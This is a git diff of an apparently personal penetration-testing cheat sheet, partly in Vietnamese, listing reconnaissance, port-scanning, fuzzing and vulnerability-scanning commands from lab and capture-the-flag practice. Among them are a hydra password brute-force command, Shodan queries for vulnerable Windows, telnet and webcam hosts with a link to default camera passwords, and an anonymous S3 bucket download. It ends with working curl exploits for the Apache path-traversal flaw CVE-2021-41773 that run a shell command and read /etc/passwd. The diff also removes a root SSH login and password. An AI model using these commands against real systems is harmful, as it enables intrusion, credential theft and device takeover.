@@ -12,10 +12,19 @@ for i in $(git log <filename>|grep ^commit|awk '{print $2}'); do git checkout $i
 /.git/logs/HEAD
 /robots.txt
 /.htaccess
-massscan
+https://github.com/gitleaks/gitleaks   #find credentials
+https://github.com/j3ssie/metabigor    #ASN
+https://github.com/arthaud/git-dumper   #dump a git repository from a website.
+https://github.com/trufflesecurity/trufflehog  #find credentials
+---------------------------------------------#scan subdomain
+amass enum -d <hostname>
 amass enum -v -src -ip -brute -min-for-recursive 2 -d cyberjutsu.com
+wfuzz -u http://10.10.11.166 -H "Host: FUZZ.trick.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt      
 subfinder
 sublist3r -v -d cyberjutsu.com
+--------------------domain
+domainfy -n eccountcil -t all  #retrieve all the domains along with their IP address
+massscan
 aquatone
 ----recon-ng
 marketplace search github
@@ -26,51 +35,59 @@ info
 options set SOURCE megacorpone.com
 run
 show hosts
------------------------------------------------------
-ssh root@128.199.190.141 -p2223
-Password: recon_cbjslab
+----------------------------------scan port
+wfuzz -u http://127.0.0.1:FUZZ -z range,75-85 -p 10.10.10.67:3128:HTTP 
+-T scan lâu nhưng an 
+nmap -T4 -sV --script
+nmap -sn 192.168.1.0/24
 nmap -T4 -A -v
+sudo nmap -T4 -sU --top-ports 1000 192.168.0.1/24
+nmap -p- --min-rate 10000 <ip>
+nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.67
 nmap -sC -sV -oA <ip>
+nmap -sC -sV -p 22,80,64999 -oA scans/nmap-scripts 10.10.10.143
 nmap -p 8008 --open 192.168.0.1/24
 rustscan -a 178.128.19.56 --range 0-65535 --ulimit 5000
 rustscan -a 127.0.0.1,0.0.0.0
 
-C:\Windows\System32\drivers\etc
 ------------------------------parameters scan
 find path javascript
-gospider -s <url>
 arjun
 ./arjun -u <url>
 
+autorecon
+https://github.com/trufflesecurity/trufflehog   --scan credentials
+https://github.com/gitleaks/gitleaks
+https://github.com/arthaud/git-dumper
+gitleak
 -------------------------------directories
-gobuster
+https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html
+/usr/share/exploitdb/exploits/php/webapps/24044.txt
+hydra 10.10.10.43 -l 0xdf -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
+gobuster dir -u http://10.129.36.23 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php
+gospider -s <url>
+dirsearch -u http://10.10.10.187 -t 10 -e html,php,txt
 ffuf ( writen by hacker )
+ffuf -w /home/kali/Desktop/Tool/wordlists/common.txt -u http://10.12.0.2/FUZZ -t 5 -p 0.1  (safe)
 ffuf -H "Host: cms.cyberjutsu-lab.tech" -u http://178.128.19.56/FUZZ -w /root/wordlists/common.txt
-fuf -u https://hackycorp.com/ -w ./common.txt -H "Host: FUZZ.hackycorp.com"
+ffuf -u https://hackycorp.com/ -w ./common.txt -H "Host: FUZZ.hackycorp.com"
 ffuf -w /root/wordlists/common.txt -u http://103.145.62.203/FUZZ -fc 403
 -e ".php"
 .php 
 .zip
 -ac  filter top famous directory
--------------------------------------------------------
-mongo <IP>
-db.getMongo().getDBNames()
-show collections
-db.users.find()
-
-esc    ->   :wq 
-------------------------------------------------------
-searchsploit struts
-----bind
-dig +short -e chaos -t txt @"z.hackycorp.com" version.bind
-
-#find info DNS
-dig @<ip> localhost
-
-dig txt key.z.hackycorp.com
-(zone transfer)
-dig axfr int @z.hackycorp.com
-dnsrecon -d z.hackycorp.com -t axfr
+https://github.com/opabravo/security-writeups/blob/main/ctf/2023-11-17%20Intigriti%201337up%20CTF%202023.md
+ffuf -c -request order_fuzz.req -w /usr/share/seclists/Fuzzing/special-chars.txt -mr "Invalid characters detected"    #filter invalid character
+-------------------------------------------------------shodan
+https://viblo.asia/p/shodan-cong-cu-tim-kiem-cho-kiem-thu-bao-mat-924lJJD0lPM#_pen-testing-ethics-12
+Apache city:hanoi 200 OK
+IIS country:vn
+cisco net:"216.219.143.0/24"
+os:"Windows 7" country:vn
+port:23 country:vn  (telnet)
+hack camera
+https://learnhackin.wordpress.com/2016/08/29/default-webcam-username-passwords/  (camera default passwd)
+os:windows vuln:cve-2019-0708   #find CVE from server
 ----------------------------------------------------
 github --> commit --> commit name  --> <url>.patch
 ---------------------------------------------scan vulnerability
@@ -78,12 +95,13 @@ nikto -h http://shop.cyberjutsu-lab.tech/ -Tuning x
 ----scan directory
 nikto -h http://shop.cyberjutsu-lab.tech/ -Cgidirs all
 -----------
-WPScan  #scan wordpress
-https://viblo.asia/p/tim-kiem-va-tieu-diet-ma-doc-tren-wordpress-site-07LKXk7D5V4
+rengine       #auto recon web tool
 FinalRecon  
 nginxpwner   --Nginx misconfigurations and vulnerabilitiesNginx misconfigurations and vulnerabilities
 https://github.com/doyensec/electronegativity   #identify mixconfig
 nuclei    --SSTI  --https://gitbook.seguranca-informatica.pt/fuzzing-and-web/cache-poisoning-using-nuclei
+nuclei còn quét được nhiều CVE khác
+nuclei -u <url>
 broken-link-checker
 https://github.com/anshumanpattnaik/http-request-smuggling
 JSFinderPlus    #find the sensitive info like email
@@ -91,11 +109,16 @@ JSFinderPlus    #find the sensitive info like email
 https://anonyviet.com/cach-scan-lo-hong-xss-tu-dong-voi-dalfox/
 python paramspider.py -d têndomain -o TênFileoutput.txt
 dalfox url http://testphp.vulnweb.com:80/hpp/index.php?pp=FUZZ -b hawhul.xss.ht
-------------------------------------------------
+------------------------------------------------wordpress scan
 wpscan --url http://pentest.huyqa-home.com
+https://viblo.asia/p/tim-kiem-va-tieu-diet-ma-doc-tren-wordpress-site-07LKXk7D5V4
 -----------------------------------------------
 aws s3 ls s3://foodhut-storage2 --no-sign-request
 aws s3 cp s3://foodhut-storage2/internal/cong-thuc-bi-mat-ga-kfc.txt
 
 https://anonyviet.com/cach-dung-reconftw-de-do-tham-mang-tim-lo-hong-bao-mat/
 fast google dork scan
+Flag{EventNayDeVLra}
+CVE202141773
+curl 'http://192.168.1.24:80/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; id'
+curl -v 'http://192.168.1.24:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'
